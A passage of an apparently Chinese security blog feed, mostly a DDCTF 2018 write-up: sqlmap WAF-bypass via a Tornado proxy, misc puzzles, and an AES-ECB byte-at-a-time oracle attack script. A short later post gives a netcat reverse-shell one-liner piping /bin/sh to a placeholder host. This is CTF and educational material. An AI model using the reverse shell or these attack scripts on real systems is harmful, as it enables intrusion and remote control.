<p>webpage.py<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.ioloop</span><br><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> web1 <span class="keyword">import</span> tamperInteract</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MainHandler</span><span class="params">(tornado.web.RequestHandler)</span>:</span></span><br><span class="line">    <span class="string">"""docstring for MainHandler"""</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self)</span>:</span></span><br><span class="line">        param = self.get_argument(<span class="string">'param'</span>)</span><br><span class="line">        param = param.replace(<span class="string">'--'</span>,<span class="string">'#'</span>)</span><br><span class="line">        self.write(tamperInteract(param))</span><br><span class="line">        print(param)</span><br><span class="line"></span><br><span class="line">application = tornado.web.Application([</span><br><span class="line">    (<span class="string">r"/"</span>, MainHandler),</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">application.listen(<span class="number">8888</span>)</span><br><span class="line">tornado.ioloop.IOLoop.instance().start()</span><br></pre></td></tr></table></figure></p>
<p>然后跑起来webpage.py之后用sqlmap跑<code>127.0.0.1:8888</code>就行了<br>这里sqlmap使用equaltolike和between两个tamper来绕过WAF<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/?param=admin"</span> --tamper equaltolike,between --level=2</span><br></pre></td></tr></table></figure></p>
<p>注入成功，然后用sqlmap跑出flag<br>在 <a href="https://blog.csdn.net/qq_31481187/article/details/59727015" target="_blank" rel="noopener">SQL注入&amp;WAF绕过姿势</a> 中有比较全面的SQL注入绕过WAF的方法  </p>
<p>Sqlmap 常用资料：<a href="https://blog.csdn.net/hxsstar/article/details/22782627" target="_blank" rel="noopener">Sqlmap Tamper整理</a>  ，<a href="https://www.cnblogs.com/hongfei/p/3872156.html" target="_blank" rel="noopener">Sqlmap用户手册</a>  </p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Misc1-签到题"><a href="#Misc1-签到题" class="headerlink" title="Misc1 签到题"></a>Misc1 签到题</h2><p>flag在公告里</p>
<h2 id="Misc2-╯°□°）╯︵-┻━┻"><a href="#Misc2-╯°□°）╯︵-┻━┻" class="headerlink" title="Misc2 (╯°□°）╯︵ ┻━┻"></a>Misc2 (╯°□°）╯︵ ┻━┻</h2><blockquote>
<p>(╯°□°）╯︵ ┻━┻<br>d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1e6b3e3b9e4b3b7b7e2b6b1e4b2b6b9e2b1b1b3b3b7e6b3b3b0e3b9b3b5e6fd</p>
</blockquote>
<p>题目就给了一个字符串,想了想又不是sha-1又不是md5又不是base64，最后看到字母不超过f，可能是16进制编码，解开之后也是很奇怪的字符串，看到有很多大于128的数，想想加个偏移看看。<br>然后写了个ascii值偏移的遍历，最后看到了flag，所有数减128再print出来就是flag了。  </p>
<h2 id="Misc3-第四扩展FS"><a href="#Misc3-第四扩展FS" class="headerlink" title="Misc3 第四扩展FS"></a>Misc3 第四扩展FS</h2><blockquote>
<p>D公司正在调查一起内部数据泄露事件，锁定嫌疑人小明，取证人员从小明手机中获取了一张图片引起了怀疑。这是一道送分题，提示已经在题目里，日常违规审计中频次有时候非常重要。<br>附件：<a href="http://ddctf.didichuxing.com/files/2c9be5d2403a8ab8de577e4c50df067c/windows.jpg" target="_blank" rel="noopener">windows.jpg</a></p>
</blockquote>
<p>这个题的题目是真的捉弄人，跟ext4一点关系都没有。。。<br>题目给了一个图片，走程序先binwalk一下，发现有东西，解出来一个zip压缩包，是加密过的。用Hxd看了下，不是伪加密，emmm试下爆破吧，准备去爆破的时候想起来没看图片的详细信息，这个好容易忘orz。。看了下标题是cof，备注是Pactera，华为手机拍的，试了下压缩包密码就是Pactera，还好看了下不然爆破跑死了，解出来一个file.txt,<br>里面是这个：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">j0hz4huHCjuji1&#125;&#123;stzenozuFDTat0sj1HzeuDzs4T4tDaz1Ci0T4oa0j11juuijeHhFCah&#125;jeDH4e&#123;DDtD1DCDaTCThzH&#125;FsFntn4a1&#123;aCu1DtDjHD1DDCChCiuejsDHiD144zTHjzF4h&#125;1FhehtTiFse44HTC0z&#123;Tn0t&#123;u&#125;enh&#125;jsnet&#125;DDTDuuzziaHH0sjC4D1D41e0H&#125;1j0aH&#123;eD&#123;CeiCniDuatDjotDFhhzFDtFHeDeTHhDFCHCozFHDTDet&#125;0DeCDDDtnTD&#123;0nCo0uCTHsHs0&#125;hs1ttF0&#125;044j&#123;sThTjC&#125;HzojThhs&#123;o&#123;n&#125;ujuT10HjCTt0DhuCj&#123;Ds1FuC41suhCt0jznDuD&#125;TeDeCCD&#123;zDhFDDDDs0HCthD&#123;j1teuziiCT&#123;DD0sDDuDTDCo&#123;uFF&#125;CDo&#123;o0FCaFu0FHjTi&#123;&#125;1Cu4DD4aFunH11Feje04eThTzDsTC&#125;hHD0Tz4DC&#123;ninoFFsez&#123;0sDeFuC&#125;0j0esah4DDttjhD1D0iCteF0nH4esTtjzDuD1&#123;CittDei4hs&#123;TT&#123;Dzts&#123;0tezs4s&#123;&#125;4DDT&#123;n4&#123;0FFT4De&#125;HhjFDs1jTHCts1zsoeh1aDTnCDz&#125;hHC4FauCeu0tFT1uHh0DuzDujaC4&#123;uHeuoh1FiT1aDeC&#123;oD&#123;DhTjoCj0u&#125;sTeCiujeehT1iuztsn0hTs1a&#125;tjaTDTFsjjezDD&#125;nsssnHz&#123;FCtuDFDuDHH&#123;siTssaeaCDjo1&#123;oh</span><br><span class="line">    ...以下省略...</span><br></pre></td></tr></table></figure></p>
<p>这又是什么加密？？没见过。。。然后看到题目是ext4，就去查ext4的资料，然而并没有什么用。。。最后看到题目里面说统计频次，尝试了下统计各字符的频次，频次由大到小排列一下，结果就是flag了。（被ext4坑死了<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">raw = <span class="string">"j0hz4huHCjuji1&#125;&#123;s..."</span> <span class="comment">#这个地方省略了，太长了</span></span><br><span class="line">S = list(raw)</span><br><span class="line">u = set(S)</span><br><span class="line">d = dict()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> u:</span><br><span class="line">    print(i,S.count(i))</span><br><span class="line">    d[S.count(i)]=i</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sorted(d,reverse=<span class="keyword">True</span>):</span><br><span class="line">    print(d[i])</span><br></pre></td></tr></table></figure></p>
<h2 id="Misc4-流量分析"><a href="#Misc4-流量分析" class="headerlink" title="Misc4 流量分析"></a>Misc4 流量分析</h2><blockquote>
<p>提示一：若感觉在中间某个容易出错的步骤，若有需要检验是否正确时，可以比较MD5: 90c490781f9c320cd1ba671fcb112d1c<br>提示二：注意补齐私钥格式<br>—–BEGIN RSA PRIVATE KEY—–<br>XXXXXXX<br>—–END RSA PRIVATE KEY—–<br>附件：<a href="http://ddctf.didichuxing.com/files/aaeb26c08965dce3b8a5f0f6a18a15a0/1cMYNO2TCQHSfJwxnvm4z.pcap" target="_blank" rel="noopener">1cMYNO2TCQHSfJwxnvm4z.pcap</a></p>
</blockquote>
<p>这个题目就是一个典型的分析ssl加密流量的题，花了很多时间在流量里面的一个转fl-g.zip文件的ftp流量，但是文件是破损的，中间有很多包丢了，这只是用来迷惑参赛者的。。。看到题目提示去找到ssl流量，但是私钥又不知道在哪，最后在SMTP流量里面发现了一个图片，base64编码的，用py解码到文件里面，打开后看到了私钥：<br><img src="/2018/04/30/DDCTF2018-WriteUp/rsa_private_key.png" alt="rsa_private_key.png"><br>mmp一个个手敲这不得累死，上OCR吧，然后试了各种在线OCR，最后发现QQ自带的文字识别是最准的，鹅厂还是6啊，里面只有很少的错误需要改一下，主要是O和0有时候会识别错误要注意检查一下，其他的都没有大问题（还是肉眼检查了一遍，不过总比手敲好，最后写wp的时候才发现题目给的MD5是用来检查私钥的。。），第一次导入私钥到wireshark的时候还有一个0没改成O，然后就卡在这儿了，ssl还是加密的，我还一度怀疑我的wireshark是不是有问题。。。最后再检查一遍才发现0没改过来。确认私钥没错之后，导入wireshark，导入之后wireshark会自己刷新一下，ssl加密的通讯立马就变成明文了，然后在明文里面找到flag。  </p>
<h2 id="Misc5-安全通信"><a href="#Misc5-安全通信" class="headerlink" title="Misc5 安全通信"></a>Misc5 安全通信</h2><blockquote>
<p>请通过nc 116.85.48.103 5002答题，mission key是b9ba15b341c847c8beba85273f9b7f90，agent id随意填就可以</p>
</blockquote>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_padding</span><span class="params">(rawstr)</span>:</span></span><br><span class="line">    remainder = len(rawstr) % <span class="number">16</span></span><br><span class="line">    <span class="keyword">if</span> remainder != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'\x00'</span> * (<span class="number">16</span> - remainder)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_encrypt</span><span class="params">(key, plaintext)</span>:</span></span><br><span class="line">    plaintext += get_padding(plaintext)</span><br><span class="line">    aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    cipher_text = aes.encrypt(plaintext).encode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="keyword">return</span> cipher_text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_hello</span><span class="params">(key, name, flag)</span>:</span></span><br><span class="line">    message = <span class="string">"Connection for mission: &#123;&#125;, your mission's flag is: &#123;&#125;"</span>.format(name, flag)</span><br><span class="line">    <span class="keyword">return</span> aes_encrypt(key, message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_input</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> raw_input()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_output</span><span class="params">(message)</span>:</span></span><br><span class="line">    print(message)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">()</span>:</span></span><br><span class="line">    print_output(<span class="string">"Please enter mission key:"</span>)</span><br><span class="line">    mission_key = get_input().rstrip()</span><br><span class="line"></span><br><span class="line">    print_output(<span class="string">"Please enter your Agent ID to secure communications:"</span>)</span><br><span class="line">    agentid = get_input().rstrip()</span><br><span class="line">    rnd = Random.new()</span><br><span class="line">    session_key = rnd.read(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    flag = <span class="string">'&lt;secret&gt;'</span></span><br><span class="line">    print_output(generate_hello(session_key, agentid, flag))</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        print_output(<span class="string">"Please send some messages to be encrypted, 'quit' to exit:"</span>)</span><br><span class="line">        msg = get_input().rstrip()</span><br><span class="line">        <span class="keyword">if</span> msg == <span class="string">'quit'</span>:</span><br><span class="line">            print_output(<span class="string">"Bye!"</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        enc = aes_encrypt(session_key, msg)</span><br><span class="line">        print_output(enc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    handle()</span><br></pre></td></tr></table></figure>
<p>AES-128加密的flag，爆破是不可能爆破的，这辈子都不可能直接爆破的。flag至少十几位啊。但是呢，仔细看看这个题目，它用的是ECB模式的AES，是分段加密的，并没有进行矩阵加密，是可以分段解密的，然后agent id，也就是name可以控制flag的在字符串中的偏移，这样看好像可以逐位爆破。思路就是用已知明文和一位未知明文组合，放在AES加密的同一分段里面，然后爆破这一位明文，校验AES值，爆破出来后再将字符串左移一位，继续爆破后面的一位明文。这个题目用的是AES-128的ECB模式，那么每16字节就是一个分段，也就是用15个已知明文字符和一个未知明文字符组合为一个分段进行爆破，于是写出解题代码（以下代码借鉴了Enigma2017 CTF中Broken Encryption一题的<a href="https://michael-myers.github.io/blog/post/enigma2017-broken-encryption-writeup/" target="_blank" rel="noopener">Writeup</a>）：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time       <span class="comment"># for using a delay in network connections</span></span><br><span class="line"><span class="keyword">import</span> telnetlib  <span class="comment"># don't try using raw sockets, you'll tear your hair out trying to send the right line feed character</span></span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">'Ex1t'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_challenge</span><span class="params">(challenge)</span>:</span></span><br><span class="line">    ciphertext_blocks = [challenge[<span class="number">0</span>:<span class="number">32</span>], challenge[<span class="number">32</span>:<span class="number">64</span>], challenge[<span class="number">64</span>:<span class="number">96</span>],</span><br><span class="line">                         challenge[<span class="number">96</span>:<span class="number">128</span>], challenge[<span class="number">128</span>:<span class="number">160</span>], challenge[<span class="number">160</span>:<span class="number">192</span>],</span><br><span class="line">                         challenge[<span class="number">192</span>:<span class="number">224</span>], challenge[<span class="number">224</span>:]]</span><br><span class="line">    <span class="keyword">return</span> ciphertext_blocks</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    host = <span class="string">'116.85.48.103'</span></span><br><span class="line">    port = <span class="number">5002</span></span><br><span class="line"></span><br><span class="line">    flag = <span class="string">"DDCTF&#123;"</span></span><br><span class="line">    padchar = <span class="string">'0'</span></span><br><span class="line">    guessed_block = <span class="string">'flag is: DDCTF&#123;'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">47</span>, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">        test_pad = <span class="string">"01234567"</span> + i * padchar</span><br><span class="line">        <span class="comment">#print(i)</span></span><br><span class="line">        tn = telnetlib.Telnet(host, port)</span><br><span class="line">        tn.read_until(<span class="string">"Please enter mission key:"</span>)</span><br><span class="line">        tn.write(<span class="string">"b9ba15b341c847c8beba85273f9b7f90\r\n"</span>)</span><br><span class="line">        tn.read_until(<span class="string">"Please enter your Agent ID to secure communications:"</span>)</span><br><span class="line">        send_string = test_pad + <span class="string">"\r\n"</span></span><br><span class="line">        <span class="comment">#print(send_string)</span></span><br><span class="line">        tn.write(send_string)</span><br><span class="line">        tn.read_until(<span class="string">'\n'</span>)</span><br><span class="line">        challenge = tn.read_until(<span class="string">'\n'</span>).decode().strip()</span><br><span class="line">        <span class="comment">#print(challenge)</span></span><br><span class="line">        ciphertext_blocks = parse_challenge(challenge)</span><br><span class="line">        <span class="keyword">for</span> guessed_byte <span class="keyword">in</span> range(<span class="number">0x20</span>, <span class="number">0x7E</span>):  <span class="comment"># printable ASCII range</span></span><br><span class="line">            test_block = guessed_block + chr(guessed_byte)</span><br><span class="line">            tn.read_until(</span><br><span class="line">                <span class="string">"Please send some messages to be encrypted, 'quit' to exit:"</span>)</span><br><span class="line">            tn.write(test_block + <span class="string">"\r\n"</span>)</span><br><span class="line">            tn.read_until(<span class="string">'\n'</span>)</span><br><span class="line">            test_enc = tn.read_until(<span class="string">'\n'</span>).decode().strip()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Telnet input MUST BE DELIVERED with a \r\n line ending. If you send</span></span><br><span class="line">            <span class="comment"># only the \n the remote end will silently error on your input and send back</span></span><br><span class="line">            <span class="comment"># partially incorrect ciphertext! Untold hours debugging that bullshit.</span></span><br><span class="line">            <span class="comment"># Here we carefully convert the bytearray to ASCII and then to a string type,</span></span><br><span class="line">            <span class="comment"># or else telnetlib barfs because of the hell that is dynamic typing.</span></span><br><span class="line"></span><br><span class="line">            print(<span class="string">"Currently guessing: "</span> + test_block)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> test_enc == ciphertext_blocks[<span class="number">6</span>]:</span><br><span class="line">                flag = flag + chr(guessed_byte)</span><br><span class="line">                guessed_block += chr(guessed_byte)</span><br><span class="line">                guessed_block = guessed_block[<span class="number">1</span>:]</span><br><span class="line">                print(<span class="string">"Guessed a byte of the secret, flag:"</span> + flag)</span><br><span class="line">                <span class="comment"># Finish the inner loop immediately, back up to the outer loop.</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        tn.close()</span><br><span class="line">        <span class="keyword">if</span>(flag[<span class="number">-1</span>] == <span class="string">'&#125;'</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">"flag: "</span> + flag)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"Done"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
]]></content>
      
        
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[windows x64函数调用约定]]></title>
      <url>https://ex1t.cn/2017/12/01/windows-x64%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/</url>
      <content type="html"><![CDATA[<p>借PC处理器架构由x86向x64过渡之机，MS清理了windows x64平台上的函数调用约定，由原来的数种包括stdcall,thiscall,fastcall,cdecl,pascal等，统一为一种新的fastcall调用方式。这种调用方式得益于x64平台寄存器数量的增加。<br>　　<br>　　windows x64平台fastcall调用约定的主要特性如下：</p>
<p>前四个整型或指针类型参数由RCX,RDX,R8,R9依次传递，前四个浮点类型参数由XMM0,XMM1,XMM2,XMM3依次传递。<br>调用函数为前四个参数在调用栈上保留相应的空间，称作shadow space或spill slot。即使被调用方没有或小于4个参数，调用函数仍然保留那么多的栈空间，这有助于在某些特殊情况下简化调用约定。<br>除前四个参数以外的任何其他参数通过栈来传递，从右至左依次入栈。<br>由调用函数负责清理调用栈。<br>小于等于64位的整型或指针类型返回值由RAX传递。<br>浮点返回值由XMM0传递。<br>更大的返回值(比如结构体)，由调用方在栈上分配空间，并有RCX持有该空间的指针并传递给被调用函数，因此整型参数使用的寄存器依次右移一格，实际只可以利用3个寄存器，其余参数入栈。函数调用结束后，RAX返回该空间的指针。<br>除RCX,RDX,R8,R9以外，RAX、R10、R11、XMM4 和 XMM5也是易变化的(volatile)寄存器。<br>RBX, RBP, RDI, RSI, R12, R14, R14, and R15寄存器则必须在使用时进行保护。<br>在寄存器中，所有参数都是右对齐的。小于64位的参数并不进行高位零扩展，也就是高位是无法预测的垃圾数据。</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[虚拟主机的两种工作方式]]></title>
      <url>https://ex1t.cn/2017/11/27/%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%B7%A5%E4%BD%9C%E6%96%B9%E5%BC%8F/</url>
      <content type="html"><![CDATA[<h3 id="WWW虚拟主机有两种工作方式："><a href="#WWW虚拟主机有两种工作方式：" class="headerlink" title="WWW虚拟主机有两种工作方式："></a>WWW虚拟主机有两种工作方式：</h3><hr>
<ul>
<li><h4 id="基于IP地址的虚拟主机方式"><a href="#基于IP地址的虚拟主机方式" class="headerlink" title="基于IP地址的虚拟主机方式"></a>基于IP地址的虚拟主机方式</h4><p>这种方式下，不同的主机名解析到不同的IP地址，提供虚拟主机服务的机器上同时设置有这些IP地址。服务器根据用户请求的目的IP地址来判定用户请求的是哪个虚拟主机的服务，从而进一步的处理。<br>缺点：基于IP地址的虚拟主机方式需要在提供虚拟主机服务的机器上设立多个IP地址，既浪费了IP地址，又限制了一台机器所能容纳的虚拟主机数目。因此这种方式越来越少使用。但是，这种方式是早期使用的HTTP 1.0协议唯一支持的虚拟主机方式。 </p>
</li>
<li><h4 id="基于主机名的虚拟主机方式"><a href="#基于主机名的虚拟主机方式" class="headerlink" title="基于主机名的虚拟主机方式"></a>基于主机名的虚拟主机方式</h4><p>由于基于IP地址的虚拟主机方式有如上的缺点，HTTP 1.1协议中增加了对基于主机名的虚拟主机的支持。具体说，当客户程序向WWW服务器发出请求时，客户想要访问的主机名也通过请求头中的“Host:”语句传递给WWW服务器。比如，www.company1.com， www.company2.com 都对应于同一个IP地址（即由同一台机器来给这两个虚拟域名提供服务），客户程序要存取<code>http://www.company1.com/index.html</code>时，发出的请求头中包含有如下的内容： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /index.html HTTP/1.1</span><br><span class="line">Host: www.company1.com</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>WWW服务器程序接收到这个请求后，可以通过检查“Host:”语句，来判定客户程序请求是哪个虚拟主机的服务，然后再进一步的处理。<br>优点：提供虚拟主机服务的机器上只要设置一个IP地址，理论上就可以给无数多个虚拟域名提供服务，占用资源少，管理方便。目前基本上都是使用这种方式来提供虚拟主机服务。<br>缺点：在早期的HTTP 1.0版本下不能使用。实际上现在使用的浏览器基本上都支持基于主机名的虚拟主机方式。</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[Requests库POST文件名为中文时出现Bug（修复方法）]]></title>
      <url>https://ex1t.cn/2017/09/22/Requests%E5%BA%93POST%E6%96%87%E4%BB%B6%E5%90%8D%E4%B8%BA%E4%B8%AD%E6%96%87%E6%97%B6%E5%87%BA%E7%8E%B0Bug%EF%BC%88%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95%EF%BC%89/</url>
      <content type="html"><![CDATA[<p>具体解决如下：</p>
<p>Inside site-packages/requests/packages/urllib3/fields.py, delete this (line ~50):</p>
<p>value = email.utils.encode_rfc2231(value, ‘utf-8’)<br>And change the line right underneath it to this:</p>
<p>value = ‘%s=”%s”‘ % (name, value)<br>This makes servers (that I’ve tested) pick up the field and process it correctly.</p>
<p><a href="https://github.com/kennethreitz/requests/issues/2117" target="_blank" rel="noopener">https://github.com/kennethreitz/requests/issues/2117</a> ~issues!  </p>
<p>这个东西折磨了3个多小时，一直以为是自己代码写错了，疯狂debug，心力交瘁啊…<br>记住了,下次用requests库写有中文的要改库文件…</p>
]]></content>
      
        
        <tags>
            
            <tag> Python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[NC reverse shell]]></title>
      <url>https://ex1t.cn/2017/04/11/NC-reverse-shell/</url>
      <content type="html"><![CDATA[<h1 id="用-NC-建立反弹型shell"><a href="#用-NC-建立反弹型shell" class="headerlink" title="用 NC 建立反弹型shell"></a>用 NC 建立反弹型shell</h1><p><a href="http://www.freebuf.com/articles/system/10632.html" target="_blank" rel="noopener">Linux后门之道——NC用法别有洞天</a></p>
<p>第一步，建立管道：<br><code>mknod /tmp/backpipe p</code> 或者 <code>mkfifo /tmp/backpipe</code><br>第二步，用管道将nc和/bin/sh连接起来：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@bt:~<span class="comment">#/bin/sh 0&lt;/tmp/backpipe | nc x.x.x.x listenport 1&gt;/tmp/backpipe</span></span><br></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> Pentest </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Pentest </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[使用numpy解方程组]]></title>
      <url>https://ex1t.cn/2017/04/03/%E4%BD%BF%E7%94%A8numpy%E8%A7%A3%E6%96%B9%E7%A8%8B%E7%BB%84/</url>
      <content type="html"><![CDATA[<h1 id="使用numpy解方程组"><a href="#使用numpy解方程组" class="headerlink" title="使用numpy解方程组"></a>使用numpy解方程组</h1><p>先放出代码示例<br><a id="more"></a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 